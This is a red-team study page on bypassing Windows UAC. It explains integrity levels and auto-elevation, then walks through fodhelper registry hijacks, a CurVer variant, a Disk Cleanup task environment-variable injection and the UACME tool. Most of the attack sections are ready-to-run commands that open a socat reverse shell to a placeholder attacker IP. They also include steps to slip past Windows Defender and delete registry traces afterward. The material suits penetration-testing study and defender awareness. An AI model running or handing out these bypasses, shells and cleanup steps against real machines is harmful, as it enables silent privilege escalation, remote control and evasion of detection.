---
{"dg-publish":true,"permalink":"/cards/red-team/bypassing-uac/","tags":["red-team/host-evasion","sunday","template"]}
---

~ [[map-of-contents/red-team\|red-team]]
### Introduction 
---
User Account Control (UAC) is a feature that allows any process to run with low privileges independent of who runs it either admin or regular user .

#### Key Topics
---
- [[#What is User Account Control|Explains the purpose of UAC and how it enforces access restrictions.]]
    
- [[#UAC: GUI based bypasses|Discusses GUI-based elevation bypasses using standard Windows tools.]]
    
- [[#AutoElevate|Describes the auto-elevation mechanism in Windows and how it's abused.]]
    
- [[#But Wait - There is MS Defender - Fodhelper exploit won't work|Covers detection issues with Windows Defender and methods to bypass them.]]
    
- [[#UAC: Environment Variable Expansion|(Section exists in the doc but no content was included yet.)]]


## Prerequisites
---
- [[map-of-contents/windows\|windows]]

## What is User Account Control

The idea for this feature is we can't rely solely on the user's identity to determine if some actions should be authorized.

Imagine the following: an administrator account downloaded a malware, once the user executes this, the malware will inherit the administrator's access token privilege, instant privilege escalation.
### Integrity Levels
---
User Account Control is a _Mandatory Integrity Control (MIC)_, is a Windows security feature that works **alongside** traditional access control mechanisms (like DACLs – Discretionary Access Control Lists). It adds an extra layer of protection by using **Integrity Levels (ILs)** to help prevent unauthorized or unintended access to resources.

Every **user**, **process**, and **resource** in Windows is assigned an Integrity Level. If your IL is too **low**, you can’t access something with a **higher** IL—even if regular permissions say you can.

![Bypassing UAC.png](/img/user/cards/red-team/images/Bypassing%20UAC.png)

**How it works:**

When a **process** tries to access a **resource** (like a file), Windows compares their ILs.

- If the process has a **lower** IL than the resource, access is denied—even if permissions would normally allow it.
    
- A process can only access resources at its own IL or lower.

- A process **inherits** the IL of the user who launched it.
- If that process creates another process (a **child process**), the child inherits the same IL.

- Even if a DACL says you can access something, you still need a **sufficiently high IL** to actually access it as MIC is much stricter than tradtional Windows permission.

### Filtered tokens
---
To accomplish this separation of roles, UAC treats regular users and administrators in a slightly different way during logon:

- **Non-administrators** will receive a single access token when logged in, which will be used for all tasks performed by the user. This token has Medium IL.
- **Administrators** will receive two access tokens:
    - **Filtered Token:** A token with Administrator privileges stripped, used for regular operations. This token has Medium IL.
    - **Elevated Token:** A token with full Administrator privileges, used when something needs to be run with administrative privileges. This token has High IL. (after clicking "Yes" on UAC prompt) -> High IL.
### Opening an Application the Usual Way
---
When opening an application: we can either open it as a non-privileged user or as an administrator. Depending on our choice, either a Medium or High integrity level token will be assigned to the spawned process:

![Bypassing UAC-1.png](/img/user/cards/red-team/images/Bypassing%20UAC-1.png)

Analyzing both console using Process Hacker (Notice the ML and HL):

![Bypassing UAC-2.png](/img/user/cards/red-team/images/Bypassing%20UAC-2.png)
One thing to note that the medium IL process is effectively denied any privileges related to being part of the administrator group.

**We can also see our privileges via:**
```C
whoami /groups
```


**UAC can be configured to run at four different notification levels:**

- **Always notify:** Notify and prompt the user for authorization when making changes to Windows settings or when a program tries to install applications or make changes to the computer.

- **Notify me only when programs try to make changes to my computer:** Notify and prompt the user for authorization when a program tries to install applications or make changes to the computer. Administrators won't be prompted when changing Windows settings. (DEFAULT SETTING)

- **Notify me only when programs try to make changes to my computer (do not dim my desktop):** Same as above, but won't run the UAC prompt on a secure desktop. it dims the screen and shows the prompt on a **separate, secure desktop**.

	- When UAC normally prompts you, it dims the desktop this prevents malicious programs from interacting with or faking the UAC prompt.

- **Never notify:** Disable UAC prompt. Administrators will run everything using a high privilege token.

From an attacker's perspective the three lower security levels are equivalent, and only the Always notify setting presents a difference.
### UAC Internals
---
When a user requires elevation, the following occurs:

![Bypassing UAC-3.png|600](/img/user/cards/red-team/images/Bypassing%20UAC-3.png)

1. The user requests to run an application as administrator.
2. A **ShellExecute** API call is made using the **runas** verb.
3. The request gets forwarded to Appinfo to handle elevation.
4. The application manifest is checked to see if [[#AutoElevate|AutoElevation ]]is allowed 


5. Appinfo executes **consent.exe**, which shows the UAC prompt on a **secure desktop**. A secure desktop is simply a separate desktop that isolates processes from whatever is running in the actual user's desktop to avoid other processes from tampering with the UAC prompt in any way.


6. If the user gives consent to run the application as administrator, the Appinfo service will execute the request using a user's Elevated Token. **Appinfo** uses an elevated token to launch the app and sets the parent process ID to the user's shell (e.g., explorer.exe) to make it appear as if the user directly launched it. 
	
	- This is done to avoid confusion in the system or breaking app behavior.


**Things to note:**
Microsoft doesn't consider UAC a security boundary but rather a simple convenience to the administrator to avoid unnecessarily running processes with administrative privileges.

Its basically a reminder to the user they are running with high privileges, Since it isn't a security boundary, any bypass technique is not considered a vulnerability to Microsoft, and therefore some of them remain unpatched to this day.

So from now own, this assumes:
You're not trying to gain admin — you already have it. You're just trying to "skip" the UAC prompt and get into elevated context directly in other words escalate from Medium IL to High IL Silently.

## UAC: GUI based bypasses
---
It is not usually applicable to real-word scenarios, as they rely on us having access to a graphical session, from where we could use the standard UAC to elavate.
### Case Study: msconfig
---
Our goal is to obtain access to a High IL command prompt without passing through UAC, opening up `msconfig` either from the start menu or "Run" dialog then viewing this process in Process Hacker:

![Bypassing UAC-4.png](/img/user/cards/red-team/images/Bypassing%20UAC-4.png)

Even without UAC prompt, `msconfig` runs with high IL process, this is possible thanks to a feature called auto elevation that allows specific binaries to elevate without requiring the user's interaction.

Spawning a shell would inherit the same access token used by `msconfig` and will run as a high IL process, we can do that by navigating to the **Tools** tab:

![Bypassing UAC-5.png](/img/user/cards/red-team/images/Bypassing%20UAC-5.png)

Then hitting launch:

![Bypassing UAC-6.png](/img/user/cards/red-team/images/Bypassing%20UAC-6.png)

Use `whoami /groups` to check your privileges.

### Case Study: azman.msc
---
Same with `msconfig`, azman.msc will auto elavate without requiring user interaction. azman.msc has no intended built-in way to spawn a shell but requires a bit of creativity.

Run `azman.msc` then confirm with Process Hacker. Notice that all .msc files are run from mmc.exe (Microsoft Management Console):

![Bypassing UAC-8.png](/img/user/cards/red-team/images/Bypassing%20UAC-8.png)

To run a shell:

At the Authorization Manager's Window, select **Help** tab and choose "Help Topics" then on the help screen, we will right-click any part of the help article and select **View Source**:

![Bypassing UAC-9.png|450](/img/user/cards/red-team/images/Bypassing%20UAC-9.png)

This will spawn a notepad process that we can leverage to get a shell. To do so, go to **File->Open** and make sure to select **All Files** in the combo box on the lower right corner. Go to `C:\Windows\System32` and search for `cmd.exe` and right-click to select Open.

## AutoElevate
---
Some executables can auto-elevate, achieving high IL without any user intervention, this applies to most of the Control Panel's functionality and some executables provided with Windows.

For an application, some requirements need to be met to auto-elevate:

- The executable must be signed by the Windows Publisher
- The executable must be contained in a trusted directory, like `%SystemRoot%/System32/` or `%ProgramFiles%/`

Depending on the type of application, additional requirements may apply:

- Executable files (.exe) must declare the **autoElevate** element inside their manifests. To check a file's manifest, we can use [sigcheck](https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck).

```C
C:\tools\> sigcheck64.exe -m c:/windows/system32/msconfig.exe
...
<asmv3:application>
	<asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
		<dpiAware>true</dpiAware>
		<autoElevate>true</autoElevate>
	</asmv3:windowsSettings>
</asmv3:application>
```

- `mmc.exe` will auto elevate depending on the .msc snap-in that the user requests. Most of the .msc files included with Windows will auto elevate.
- Windows keeps an additional list of executables that auto elevate even when not requested in the manifest. This list includes `pkgmgr.exe` and `spinstall.exe`, for example.
- COM objects can also request auto-elevation by configuring some registry keys ([https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker](https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker)).

### Case Study: Fodhelper
---
Fodhelper.exe is one of Windows default executables in charge of managing Windows optional features. Like most of the programs used for system configuration, fodhelper can auto elevate when using default UAC settings so that administrators won't be prompted for elevation when performing standard administrative tasks. 

The difference between this versus previously, this can be **abused** without having access to a GUI. This means it can be used through a medium integrity remote shell and leveraged into a fully functional high integrity process.

What was noticed about fodhelper is that it searches the registry for a specific key of interest:

![Bypassing UAC-10.png](/img/user/cards/red-team/images/Bypassing%20UAC-10.png)

**Windows uses the registry to decide how to open files or URLs**. This info is stored using a **ProgID** (Programmatic ID), think of it similar to a Primary Key in SQL languages but in this case they link file types or protocols to a specific program.

The registry location **`HKEY_CLASSES_ROOT`** is not its own thing — it’s a _merged view_ of:

- `HKLM\Software\Classes` (system-wide settings)
    
- `HKCU\Software\Classes` (user-specific settings)

**User-specific settings take priority** — so if you define your own ProgID handler under `HKCU`, Windows will use it **instead of** the system-wide one.

**If you (the attacker) create your own fake handler for `ms-settings` in `HKCU`**, you can tell it to run **any command you want**, like launching a `cmd.exe` shell.

### Putting it All Together
---
Assume we have a shell with:

![Bypassing UAC-11.png](/img/user/cards/red-team/images/Bypassing%20UAC-11.png)
However using `whoami /groups` we see that it has the Medium IL token, to bypass this:

```C
C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
The operation completed successfully.

C:\> reg add %REG_KEY% /d %CMD% /f
```

Notice how we need to create an empty value called **DelegateExecute** for the class association to take effect. If this registry value is not present, the operating system will ignore the command and use the system-wide class association instead.

At the same command prompt window execute `fodhelper.exe` then back at the attacker machine check your netcat:

![Bypassing UAC-12.png](/img/user/cards/red-team/images/Bypassing%20UAC-12.png)

### Clearing our Tracks
---
As a result of executing this exploit, some artefacts were created on the target system in the form of registry keys. To avoid detection, we need to clean up after ourselves with the following command:

```C
reg delete HKCU\Software\Classes\ms-settings\ /f
```

## But Wait - There is MS Defender - Fodhelper exploit won't work
---
Doing the same exploit again: Just as you change the `(default)` value in `HKCU\Software\Classes\ms-settings\Shell\Open\command` to insert your reverse shell command, a Windows Defender notification will pop up:

![Bypassing UAC-13.png](/img/user/cards/red-team/images/Bypassing%20UAC-13.png)

Clicking the notification:

![Bypassing UAC-14.png|450](/img/user/cards/red-team/images/Bypassing%20UAC-14.png)

But the good thing is with a slight modification it will work:

```C
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command

set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

reg add %REG_KEY% /v "DelegateExecute" /d "" /f

reg add %REG_KEY% /d %CMD% /f & reg query %REG_KEY%
```

But adding a quick query to the offending registry value right after setting it to the command required for our reverse shell, we still get alerted by Windows Defender, and a second later, the offending registry value gets deleted as expected.

Right after setting the registry value, **we need the command to run quickly:**

```C

Same command as the above but at the last command add:

reg add %REG_KEY% /d %CMD% /f & reg query %REG_KEY% & fodhelper.exe
```

However, the problem is it's basically a race between you and the Antivirus see who gets first making this exploit unreliable.

![Bypassing UAC-15.png](/img/user/cards/red-team/images/Bypassing%20UAC-15.png)

It works (not shown) but Windows Defender still detects it, another thing is it gives little room for variation, as we need to write specific registry keys to trigger it, making it easy for Windows Defender to detect.
### Modified fodhelper exploit
---
Instead of writing our payload into `HKCU\Software\Classes\ms-settings\Shell\Open\command`, we will use the `CurVer` entry under a progID registry key. This entry is used when you have multiple instances of an application with different versions running on the same system, this allows to point to the default version of the application to be used by Windows when opening a given file type.

The idea is still the same we are still hijacking how Windows opens `ms-settings:` via the registry. But instead of directly changing the `command` under `ms-settings`, you **redirect `ms-settings` to a fake file type** (your own `.pwn`), and put your payload **there**.

```powershell
$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
    
New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
    
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

Notice the `.pwn` in the registry path — this is a **custom ProgID** we create. Normally, `fodhelper.exe` looks for the `ms-settings` ProgID to determine what command to run when opening `ms-settings:` URLs.

But we set a `CurVer` value under `ms-settings` that **points to our `.pwn` ProgID** instead. This tells Windows, to dont use `ms-settings` handler -- use my `.pwn` instead.

However, it stills gets detected by Windows Defender but the good thing is AV software are implemented strictly against the published exploit, doing the same thing in `cmd.exe` no alert from Defender.

```C
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f

reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f

fodhelper.exe
```

Clear your tracks:

```C
reg delete "HKCU\Software\Classes\.thm\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f
```

## UAC: Environment Variable Expansion
---
From the previous exploits, we can bypass UAC as most of these apps have the autoElevate flag set on on their manifests. However, if UAC is configured on the "Always Notify" level, fodhelper and similar apps won't be of any use as they will require the user to go through the UAC prompt to elevate

Not hope is lost, in this time you will abuse the scheduled task that can be run by any user but will execute with the highest privileges available to the caller, as this does not trigger the UAC prompt when launched.

### Disk Cleanup Scheduled Task
---
For demonstration: disable Windows Defender then proceed to open Task Scheduler:

![Bypassing UAC-16.png|600](/img/user/cards/red-team/images/Bypassing%20UAC-16.png)

- The task is configured to run with the **Users** account, which means it will inherit the privileges from the calling user.
- **Run with highest privileges** will use the highest privilege security token available to the calling user, a high IL token for an administrator.
- **Note:** this will not work for regular non-admin works as it will execute with medium IL only.

Moving to the **Action and Settings** tabs:

![Bypassing UAC-17.png](/img/user/cards/red-team/images/Bypassing%20UAC-17.png)

The task can be run on-demand, executing the following command when invoked:

```C
%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%
```

The command depends on environment variable, you might be able to inject commands through them and execute it by starting DiskCleanup task manually.

Overriding the `%windir%` variable through the registry by creating an entry in `HKCU\Environment`:

A Windows **scheduled task** (like Disk Cleanup) runs this:

```C
%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%
```

Normally, `%windir%` is `C:\Windows`.

But here’s the **trick**: You **override `%windir%`** from `HKCU\Environment` to whatever we want:

```C
cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%
```

- **REM** is ignored as comment

**Putting it together**

```C
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f

schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```

Before the last command run a netcat/listening server first.

## Automated Exploitation
---

https://github.com/hfiref0x/UACME - no need to write exploits from scratch.

Akagi, which runs the actual UAC bypasses, using the tool is straightforward and only requires you to indicate the number corresponding to the method to be tested. A complete list of methods is available on the project's GitHub description. If you want to test for method 33, you can do the following from a command prompt, and a high integrity cmd.exe will pop up:

```C
UACME-Akagi64.exe 33
```



### Questions and Problems
---
## Conclusion


